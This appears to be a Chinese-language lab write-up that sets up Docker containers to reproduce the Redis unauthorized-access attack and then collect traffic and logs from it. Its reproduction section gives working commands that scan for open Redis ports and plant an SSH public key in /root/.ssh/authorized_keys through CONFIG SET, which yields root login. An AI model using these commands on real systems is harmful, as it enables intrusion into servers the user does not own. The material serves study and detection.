## 攻击主机

./hacker/Dockerfile

```dockerfile
FROM ubuntu:18.04

# 替换镜像源
RUN cp /etc/apt/sources.list /etc/apt/sources.list.bak && \
    sed -i 's#deb.debian.org#mirrors.tuna.tsinghua.edu.cn#g' /etc/apt/sources.list && \
    sed -i 's#archive.ubuntu.com#mirrors.tuna.tsinghua.edu.cn#g' /etc/apt/sources.list && \
    sed -i 's#security.debian.org#mirrors.tuna.tsinghua.edu.cn#g' /etc/apt/sources.list && \
    sed -i 's#security.ubuntu.com#mirrors.tuna.tsinghua.edu.cn#g' /etc/apt/sources.list && \
    apt-get update -y && apt-get upgrade -y

RUN apt-get install -y openssh-client masscan net-tools redis-tools iputils-ping telnet

CMD ["sleep", "infinity"]
```

## 漏洞主机

./redis_vul/Dockerfile

```dockerfile
FROM redis:5.0.7

USER root

# 替换镜像源
RUN cp /etc/apt/sources.list /etc/apt/sources.list.bak && \
    sed -i 's#deb.debian.org#mirrors.tuna.tsinghua.edu.cn#g' /etc/apt/sources.list && \
    sed -i 's#archive.ubuntu.com#mirrors.tuna.tsinghua.edu.cn#g' /etc/apt/sources.list && \
    sed -i 's#security.debian.org#mirrors.tuna.tsinghua.edu.cn#g' /etc/apt/sources.list && \
    sed -i 's#security.ubuntu.com#mirrors.tuna.tsinghua.edu.cn#g' /etc/apt/sources.list && \
    apt-get update

RUN apt-get update && apt-get install -y net-tools openssh-server && \
    mkdir /run/sshd && \
    sed -i "s/^#PermitRootLogin.*/PermitRootLogin yes/g" /etc/ssh/sshd_config && \
    sed -i "s/#PasswordAuthentication.*/PasswordAuthentication no/g" /etc/ssh/sshd_config

RUN echo 'root:password' | chpasswd

EXPOSE 22

#ENTRYPOINT ["redis-server"]
```

## 漏洞环境

```yml
version: "3.7"
services:
  redis:
    build: ./redis_vul/.
    networks:
      local_network:
        ipv4_address: 192.168.1.59

  scanner:
    build: ./hacker/.
    volumes:
      - ./ssh:/home/ssh
    networks:
      local_network:
        ipv4_address: 192.168.1.60

networks:
  local_network:
    name: local_network
    driver: macvlan
    driver_opts:
      parent: eth0
    ipam:
      config:
        - subnet: 192.168.1.0/24
```

> ```bash
> # docker 网络列表
> docker network ls
> # docker 删除网络
> docker network rm local_network
> # docker 创建 macvlan 网络
> docker network create -d macvlan --subnet=192.168.1.0/24 --gateway=192.168.1.1 -o parent=eth0 local_network
> # docker 查看指定容器的 ip
> docker inspect -f '{{range.NetworkSettings.Networks}}{{.IPAddress}}{{end}}' cve-2021-3129-attacker-1
> ```
> **<font color="#ff6666">虚拟本地网络互通仅支持 Linux 系统</font>**
> 
> **<font color="#ff6666">parent: eth0 改为当前宿主机的网卡</font>**

## 场景复现

```shell
# docker 创建 macvlan 网络
docker network create -d macvlan --subnet=192.168.1.0/24 --gateway=192.168.1.1 -o parent=eth0 local_network
# 构建并部署漏洞环境
docker-compose build && docker-compose up -d && docker ps -a
# 漏洞环境启用 ssh
docker-compose exec redis service ssh start
# 进入攻击主机
docker-compose exec scanner bash
# 在攻击主机中扫描局域网内所有开启 6379 端口的主机
masscan -p6379 -sS 192.168.0.0/24
# Discovered open port 6379/tcp on 172.18.0.2
# 生成密钥对
ssh-keygen -t rsa -f $HOME/.ssh/id_rsa_hack -N ""
(echo -e "\n\n"; cat $HOME/.ssh/id_rsa_hack.pub; echo -e "\n\n") > key.txt
# Redis 未授权利用
cat key.txt | redis-cli -h 192.168.1.59 -x set xxx
redis-cli -h 192.168.1.59 config set dir /root/.ssh
redis-cli -h 192.168.1.59 config set dbfilename authorized_keys
redis-cli -h 192.168.1.59 save
# 查看当前主机 ip
ifconfig | grep 192
# ssh root@192.168.1.59
# 如果密钥名称不是 id_rsa 则需要 -i 指定密钥
ssh -i $HOME/.ssh/id_rsa_hack root@192.168.1.59
```

## 采集流量

- [ssh免密登录.pcap](http://192.168.0.5/server/index.php?s=/api/attachment/visitFile/sign/1939ed854fae5b0a607608b137748b0e "[ssh免密登录.pcap")
- [redis未授权访问并设置公钥.pcap](http://192.168.0.5/server/index.php?s=/api/attachment/visitFile/sign/5653ffdf55777126b3913a254786aa98 "[redis未授权访问并设置公钥.pcap")
- [masscan 扫描 172.18.0 网段 6379 端口.pcap](http://192.168.0.5/server/index.php?s=/api/attachment/visitFile/sign/1c0db99c307882c0f52552edf0e3ceb7 "[masscan 扫描 172.18.0 网段 6379 端口-FULL.pcap")

## 日志采集

### Redis 日志

> 需要先配置 `CONFIG SET slowlog-log-slower-than 0`
> `slowlog-log-slower-than` 参数用于设置超时时间，单位是微秒。如果命令执行时间超过这个值，就会被记录在 `slowlog` 中。将这个参数设置为0表示记录所有命令。
> 通过 `redis-cli slowlog get 100` 获取 100 条慢日志

```shell
# 获取 10000 条慢日志
redis-cli -h 192.168.1.59 slowlog get 10000 | grep -B 2 -A 4 -i config | awk '{gsub(/^\-\-/, ""); printf "%s ", $0}/^$/{print ""}'
# 以下是输出内容
# 1683256706 22 config get dir 172.18.0.3:56426
# 
# 1683256645 1 config set dbfilename authorized_keys 172.18.0.3:38240
# 1683256638 189 config set dir /root/.ssh 172.18.0.3:60666
# 1683256607 4 config set slowlog-log-slower-than 0 172.18.0.3:48738
```